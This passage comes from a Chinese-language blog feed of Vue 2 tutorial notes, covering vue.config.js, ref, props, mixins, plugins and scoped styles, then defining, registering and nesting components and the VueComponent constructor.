class="hljs-regexp">//</span>页面上显示为h1标题的hello<br>&#125;<br></code></pre></td></tr></table></figure><p>化简后变成了<code>render: h =&gt; h(App)</code></p><h2 id="四-默认配置"><a href="#四-默认配置" class="headerlink" title="四 . 默认配置"></a>四 . 默认配置</h2><p>有关脚手架的配置文件，我们可以使用<code>vue inspect &gt; output.js</code>下查看，得到一个output.js，里面可以<strong>查看配置文件</strong>，<strong>但不能真正实现修改</strong>，如果我们需要修改配置文件，就需要<code>vue.config.js</code>在里面添加配置项进行修改</p><p>比如我这里关掉vue脚手架的语法检查</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">const</span> &#123; <span class="hljs-variable">defineConfig</span> &#125; = <span class="hljs-function"><span class="hljs-title">require</span>(<span class="hljs-string">&#x27;@vue/cli-service&#x27;</span>)</span><br><span class="hljs-variable">module.exports</span> = <span class="hljs-function"><span class="hljs-title">defineConfig</span>(&#123;</span><br><span class="hljs-function">  <span class="hljs-variable">transpileDependencies</span>: <span class="hljs-variable"><span class="hljs-literal">true</span></span></span><br><span class="hljs-function">&#125;)</span><br><span class="hljs-variable">module.exports</span> = <span class="hljs-function"><span class="hljs-title">defineConfig</span>(&#123;</span><br><span class="hljs-function">  <span class="hljs-variable">lintOnSave</span>:<span class="hljs-variable"><span class="hljs-literal">false</span></span>  <span class="hljs-comment">//关闭语法检查</span></span><br><span class="hljs-function">&#125;)</span><br><br></code></pre></td></tr></table></figure><h2 id="五-ref属性"><a href="#五-ref属性" class="headerlink" title="五 . ref属性"></a>五 . ref属性</h2><p>1.用来给元素或者子组件注册引用信息（id替代者）</p><p>2.应用在html元素上是获取真实的DOM元素，应用在组件上得到的是组件实例对象（vc）</p><p>3.使用方法：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;h1 <span class="hljs-attribute">v-text</span>=<span class="hljs-string">&quot;msg&quot;</span> <span class="hljs-attribute">ref</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;&lt;/h1&gt;<br>&lt;button @<span class="hljs-attribute">click</span>=<span class="hljs-string">&quot;showDom&quot;</span>&gt;点我获取元素&lt;/button&gt;<br>&lt;School <span class="hljs-attribute">ref</span>=<span class="hljs-string">&quot;School&quot;</span> /&gt;<br>&lt;School <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;School&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>添加在标签处添加ref属性</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">showDom</span><span class="hljs-params">()</span></span>&#123;<br>         console<span class="hljs-selector-class">.log</span>(this.<span class="hljs-variable">$refs</span>.title)<span class="hljs-comment">//拿到的是真实的DOM</span><br>         console<span class="hljs-selector-class">.log</span>(this.<span class="hljs-variable">$refs</span>.School)<span class="hljs-comment">//拿到的是vc</span><br>         console<span class="hljs-selector-class">.log</span>(document<span class="hljs-selector-class">.getElementById</span>(<span class="hljs-string">&#x27;School&#x27;</span>))<span class="hljs-comment">//获取的是School组件的template标签下的内容</span><br>     &#125;<br></code></pre></td></tr></table></figure><p>通过this.$refs拿到元素</p><h2 id="六-props配置"><a href="#六-props配置" class="headerlink" title="六 . props配置"></a>六 . props配置</h2><p>这里补充一个小坑</p><p>在更新src中的文件时</p><p><img src="https://s2.loli.net/2022/03/28/B2q5UAZHbEivryK.png" alt="小坑.png"></p><p>可能会出现组件写了但是不显示的情况，这个情况是因为：1.我们没有在App中引入 2.我们没有在template标签里面加入 3.我们的name写错了。</p><p>下面我们讲props配置：让组件接收外部传进来的数据</p><p>我们在使用props之前，需要在对应的组件标签中加入我们需要的参数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 必须写成字符串类型 写成其他类型(包括表达式)需要加冒号:--&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Student</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;张三&quot;</span> <span class="hljs-attr">:age</span>=<span class="hljs-string">18</span> <span class="hljs-attr">sex</span>=<span class="hljs-string">&quot;男&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>这里有三种情况：1.传字符串如name，那么记得加” “</p><p>​                             2.传数字，那么像age，需要加：表示v-bind</p><p>​                             3.传表达式，如<code>:age=&quot;19+1&quot;</code>,代表传过去的是Number类型而且是20</p><p>而props的写法也有三种：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>   第一个props<br><span class="hljs-regexp">//</span>   props: [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-string">&#x27;sex&#x27;</span>]<span class="hljs-regexp">//</span>props配置接参数<br><span class="hljs-regexp">//</span>   第二个props 接收同时对数据进行限制，不符合类型控制台会提示<br><span class="hljs-regexp">//</span> props:&#123;<br><span class="hljs-regexp">//</span>     name:String,<br><span class="hljs-regexp">//</span>     age:Number,<br><span class="hljs-regexp">//</span>     sex:String<br><span class="hljs-regexp">//</span> &#125;<br><span class="hljs-regexp">//</span>   第三种props 拥有三个配置项<br><span class="hljs-regexp">//</span> props:&#123;<br><span class="hljs-regexp">//</span>     name:&#123;<br><span class="hljs-regexp">//</span>     type:String,<br><span class="hljs-regexp">//</span>     require:true<span class="hljs-regexp">//</span>name是必要的<br><span class="hljs-regexp">//</span>     &#125;,<br><span class="hljs-regexp">//</span>     age:&#123;<br><span class="hljs-regexp">//</span>         type:Number,<br><span class="hljs-regexp">//</span>         default:<span class="hljs-number">99</span><span class="hljs-regexp">//</span>不传默认<span class="hljs-number">99</span><br><span class="hljs-regexp">//</span>     &#125;,<br><span class="hljs-regexp">//</span>     sex:&#123;<br><span class="hljs-regexp">//</span>         type:String,<br><span class="hljs-regexp">//</span>         require:true<span class="hljs-regexp">//</span>一般default和require不一起使用<br><span class="hljs-regexp">//</span>     &#125;<br><span class="hljs-regexp">//</span> &#125;<br></code></pre></td></tr></table></figure><p>这样我们就可以使用插值语法进行数据代理</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生姓名：</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">name</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生年龄：</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">age</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生性别：</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">sex</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>并展示我们之前在标签中写入的信息了</p><h3 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h3><p>1.我们的整个配置叫props，但是我们在props中加入的数据是一个一个的prop</p><p>2.我们在props:[]中不要申明没有传入的数据，不然会赋值为undefined</p><p>3.props中的属性不能修改，如果直接修改，虽然页面会改变，但是控制台会报错</p><p>​    如果我们像修改props中的数据：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">data</span>() &#123;<br><br>  <span class="hljs-keyword">return</span> &#123;<br><br>   msg: <span class="hljs-string">&quot;我是一名学生&quot;</span>,<br><br>   myagg:<span class="hljs-keyword">this</span>.age+<span class="hljs-number">1</span><span class="hljs-comment">//由于vue先扫描props，所以可以使用this.age</span><br><br>  &#125;;<br></code></pre></td></tr></table></figure><p>通过在data中加入myagg与this.age 进行关联，我们就可以动态改变显示的值</p><h2 id="七-混合"><a href="#七-混合" class="headerlink" title="七. 混合"></a>七. 混合</h2><p>可以将多个组件共有的配置混合，更好的实现组件功能的复用</p><p>混合需要先建立一个mixin.js的文件</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">// 分别暴露</span><br>export <span class="hljs-keyword">const</span> <span class="hljs-keyword">mixin</span> = &#123;<br>    methods: &#123;<br>        showname() &#123;<br>            alert(<span class="hljs-keyword">this</span>.name)<br>        &#125;<br>    &#125;,<br>&#125;<br><span class="hljs-comment">//混合数据</span><br>export <span class="hljs-keyword">const</span> mixin2 = &#123;<br>    data()&#123;<br>        <span class="hljs-keyword">return</span> &#123;<br>            x:<span class="hljs-number">100</span>,<br>            y:<span class="hljs-number">200</span><br>        &#125;<br>    &#125;,<br>    mounted() &#123;<br>        console.log(<span class="hljs-string">&quot;hello!!!&quot;</span>)<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>文件中加入需要复用的功能代码，赋值并暴露</p><p>然后在组件中加入</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">mixin</span>,mixin2 &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;../mixin&quot;</span>;<br>export <span class="hljs-keyword">default</span> &#123;<br>mixins: [<span class="hljs-keyword">mixin</span>,mixin2],<br>&#125;;<br></code></pre></td></tr></table></figure><p>便完成了混合</p><p><strong>还有一种全局混合</strong></p><p>在main.js 中加入</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">mixin</span>,mixin2 &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./mixin&quot;</span><br><br><span class="hljs-comment">// 全局配置mixin</span><br>Vue.<span class="hljs-keyword">mixin</span>(mixin2)<br></code></pre></td></tr></table></figure><p>然后就可以直接使用mixin:[]使用我们的混合了</p><h3 id="tips：-1"><a href="#tips：-1" class="headerlink" title="tips："></a>tips：</h3><p>1.混合中的数据不会覆盖data和method中的数据</p><p>2.混合中的生命周期钩子会和原组件中的生命周期钩子共存，并一起发挥作用，而且是混合中的作用在前</p><h2 id="八-插件"><a href="#八-插件" class="headerlink" title="八 . 插件"></a>八 . 插件</h2><p>插件用于极大增强我们vue的功能</p><p>定义插件：我们创建一个plugins.js的文件用于我们的插件</p><p>​                  在这个里面我们通过全局定义一些过滤器，自定义指令，混入……</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;vue&quot;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-comment">// 获得参数是vue的构造函数</span><br>    <span class="hljs-function"><span class="hljs-title">install</span>(<span class="hljs-params">vue,x,y,z</span>)</span> &#123;<br>        <span class="hljs-built_in">console</span>.log(x,y,z);<span class="hljs-comment">//接收use过来的参数</span><br>        Vue.filter(<span class="hljs-string">&#x27;mySlice&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">values</span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> values.slice(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>)<br>        &#125;)<br>        <span class="hljs-comment">//全局directive，注意没有s，与全局filter类似</span><br>        Vue.directive(<span class="hljs-string">&#x27;fbind&#x27;</span>,&#123;<br>            <span class="hljs-function"><span class="hljs-title">bind</span>(<span class="hljs-params">element,binding</span>)</span>&#123;<br>                        <span class="hljs-comment">//成功绑定时</span><br>                        element.value=binding.value<br>                    &#125;,<br>                    <span class="hljs-function"><span class="hljs-title">inserted</span>(<span class="hljs-params">element,binding</span>)</span>&#123;<br>                        <span class="hljs-comment">//所在元素插入时</span><br>                        element.focus()<span class="hljs-comment">//插入时获取焦点。是函数形无法实现的</span><br>                    &#125;,<br>                    <span class="hljs-function"><span class="hljs-title">update</span>(<span class="hljs-params">element,binding</span>)</span>&#123;<br>                        <span class="hljs-comment">//模板重新解析时</span><br>                        element.value=binding.value<br>                        element.focus()<br>                    &#125;<br>        &#125;)<br>        <span class="hljs-comment">// 定义混入</span><br>        Vue.mixin(&#123;<br>            <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;<br>                <span class="hljs-keyword">return</span> &#123;<br>                    <span class="hljs-attr">x</span>: <span class="hljs-number">100</span>,<br>                    <span class="hljs-attr">y</span>: <span class="hljs-number">200</span><br>                &#125;<br>            &#125;,<br>        &#125;)<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>使用插件：</p><p>在main.js 中我们通过引入插件文件使用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> plugins from &#x27;./plugins&#x27;<br><span class="hljs-attribute">Vue</span>.use(plugins,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>特别注意这里的vue,1,2,3 是可以通过use向install传递的参数 而<strong>默认的第一个参数则是vue的构造方法，通过这个构造方法，我们可以在vc和vm中使用在plugins定义的方法</strong></p><h2 id="九-scoped"><a href="#九-scoped" class="headerlink" title="九 . scoped"></a>九 . scoped</h2><p>我们在编辑组件样式的时候，有可能出现样式名相同的情况，1号组件的样式是为.demo服务的，但是我2号组件也有一个.demo，于是便会出现冲突</p><p>于是我们在style后面加入一个scoped ==&gt;让样式在局部生效，不妨碍其他的样式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css"></span><br><span class="css"><span class="hljs-comment">/* 这里放置css样式 */</span></span><br><span class="css"><span class="hljs-selector-class">.demo</span> &#123;</span><br><span class="css">  <span class="hljs-attribute">background-color</span>: orange;</span><br><span class="css">&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>tips：</strong>App组件当中不要使用，因为App组件样式是为了全局服务</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脚手架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue组件</title>
    <link href="/2022/03/22/%E7%BB%84%E4%BB%B6/"/>
    <url>/2022/03/22/%E7%BB%84%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>为了提高编程的复用性和降低编程的冗杂度，我们创造了组件</p><span id="more"></span><h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><h3 id="Q："><a href="#Q：" class="headerlink" title="Q："></a>Q：</h3><p>1.什么是组件</p><p>​    组件是实现应用中局部功能的代码和资源的集合</p><p>2.组件的作用</p><p>​    组件的不冗杂，复用性高，而且可以嵌套</p><p>模块化就是简单的拆分，而组件化是将代码封装以实现功能点</p><h2 id="一-组件的引入"><a href="#一-组件的引入" class="headerlink" title="一 . 组件的引入"></a>一 . 组件的引入</h2><p>在Vue中使用组件包括三步 </p><ol><li>定义组件</li></ol><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">const student = Vue.extend(&#123;</span><br><span class="xml">            template: `</span><br><span class="xml"></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生姓名：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生性别：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">sex</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">​            `,//用template写html格式，注意需要有根标签</span><br><span class="xml">​            data()&#123;</span><br><span class="xml">​                return&#123;</span><br><span class="xml">​                name:&#x27;张三&#x27;,</span><br><span class="xml">​                sex:&#x27;male&#x27;</span><br><span class="xml">​                &#125;</span><br><span class="xml">​            &#125;//data写成函数形式</span><br><span class="xml">​        &#125;)</span><br></code></pre></td></tr></table></figure><p>其中使用template配置项创建组件的html部分，data()部分写成函数形式，其他的监听器和计算属性等等都可以照写。<strong>注意data（要写return）</strong></p><p>2.注册组件</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-type">Vue</span>(&#123;<br><br>​      el: <span class="hljs-type"></span>&#x27;<span class="hljs-meta">#app&#x27;,</span><br><br>​      <span class="hljs-comment">//注册组件</span><br><br>​      components:<span class="hljs-type"></span>&#123;<br><br>​        school,<span class="hljs-comment">//简写形式</span><br><br>​        zhangsan:<span class="hljs-type">student</span><br><br>​      &#125;<br><br>​    &#125;);<br></code></pre></td></tr></table></figure><p>在vm当中注册组件，在components配置项中以 key : value形式注册组件，可以简写</p><p>还有一种全局注册形式</p><p><code>Vue.component(&#123;&#39;组件使用名&#39;,组件变量名&#125;)</code></p><p>3.使用组件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;app&#x27;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 标签形式引入组件 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span> <br>       <span class="hljs-tag">&lt;<span class="hljs-name">zhangsan</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">zhangsan</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在Vue所管理的元素下插入标签，叫做组件标签，便可以显示组件中的信息</p><p>在组件书写的时候需要注意的几个点：</p><p><img src="https://s2.loli.net/2022/03/28/JiFr73HIZNnRtCO.png" alt="组件书写注意事项.png"></p><p>1.name配置项可以修改组件在开发者工具中的名字，但其他地方的名字是不会改变的</p><p>2.简写形式</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">// 简写形式</span><br><span class="xml">        const student = &#123;</span><br><span class="xml">            template: `</span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生姓名：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生性别：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">sex</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">            `,//用template写html格式，注意需要有根标签</span><br><span class="xml">            data()&#123;</span><br><span class="xml">                return&#123;</span><br><span class="xml">                name:&#x27;张三&#x27;,</span><br><span class="xml">                sex:&#x27;male&#x27;</span><br><span class="xml">                &#125;</span><br><span class="xml">            &#125;//data写成函数形式</span><br><span class="xml">        &#125;</span><br></code></pre></td></tr></table></figure><p><strong>总结</strong></p><p><img src="https://s2.loli.net/2022/03/28/bRc2UiwLEYk7sPn.png" alt="非单文件组件总结1.png"></p><h2 id="二-组件的嵌套"><a href="#二-组件的嵌套" class="headerlink" title="二  . 组件的嵌套"></a>二  . 组件的嵌套</h2><p>因为组件中有data属性，所以也可以有components属性，用这个完成我们的套娃</p><p>我们在school中嵌套student属性</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">const school = Vue.extend(&#123;</span><br><span class="xml">            template: `</span><br><span class="xml"></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校名称：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校地址：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">address</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">zhangsan</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">zhangsan</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">​            `,</span><br><span class="xml">​            data() &#123;</span><br><span class="xml">​                return &#123;</span><br><span class="xml">​                    name: &#x27;swpu&#x27;,</span><br><span class="xml">​                    address: &#x27;新都&#x27;</span><br><span class="xml">​                &#125;</span><br><span class="xml">​            &#125;,</span><br><span class="xml">​            //嵌套components</span><br><span class="xml">​            components: &#123;</span><br><span class="xml">​                zhangsan: student</span><br><span class="xml">​            &#125;</span><br><span class="xml">​        &#125;)</span><br><span class="xml"></span><br><span class="xml"></span><br></code></pre></td></tr></table></figure><p>将student注册在school中,并在template配置下加入student所对应的标签</p><p>此外我们还可以设置一个更大的组件</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">const app = Vue.extend(&#123;<br>           template: `<br>           <span class="hljs-variable">&lt;div&gt;</span><br>           <span class="hljs-variable">&lt;hello&gt;</span><span class="hljs-variable">&lt;/hello&gt;</span><br>           <span class="hljs-variable">&lt;school&gt;</span><span class="hljs-variable">&lt;/school&gt;</span><br>           <span class="hljs-variable">&lt;/div&gt;</span> <br>           `,<br>           components:&#123;<br>               school,<br>               hello,<br>           &#125;<br>       &#125;)<br>       var vm = new Vue(&#123;<br>           el: &#x27;<span class="hljs-comment">#app&#x27;,</span><br>           data: &#123;<br>           &#125;,<br>           components: &#123;<br>               app<br>           &#125;<br>       &#125;);<br></code></pre></td></tr></table></figure><p>app组件用于定义一个全局的总组件,将其他的组件嵌套进入app，再在vm中注册app=》即可以使用一个<app>标签实现几个组件的功能了</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>组件书写需要有顺序，<strong>子组件需要先写，父组件后写</strong>，不然会出现未定义使用的情况</p><h2 id="三-VueCompoent"><a href="#三-VueCompoent" class="headerlink" title="三 . VueCompoent"></a>三 . VueCompoent</h2><p>当我们使用Vue.extend时，Vue会帮我们调用一个构造函数VueComponent()，这个构造函数是我们组件十分重要的知识点</p><p>我们看Vue.extend的源码</p><p><img src="https://s2.loli.net/2022/03/28/BVfb4sYkUadNoRh.png" alt="Vue.extend源码.png"></p><p>每次调用Vue.extend()，便会生成一个sub，sub是一个vuecomponent构造函数，这个sub在最后会被return。这说明了非常重要的一点：<strong>Vue.extend()每次调用都是生成的一个新的VueComponent</strong>，学过java的应该可以很好理解，即形成了<strong>统一构造函数下的不同实例对象</strong></p><p>其二，在Vue中我们使用this，指向的是vm，<strong>而在组件当中使用this，指向的便是VueComponent</strong>，简称vc，而在vc中 和vm一样，有自己的数据代理和数据检测</p><p><strong>但是vc是归vm管的，在vm管理的vc下也会有子vc</strong>,vm vc是非常相似的，但是vc中没有el，也就是说，vc交于vm再指定为哪一个el工作 </p><h2 id="四-一个重要的内置关系"><a 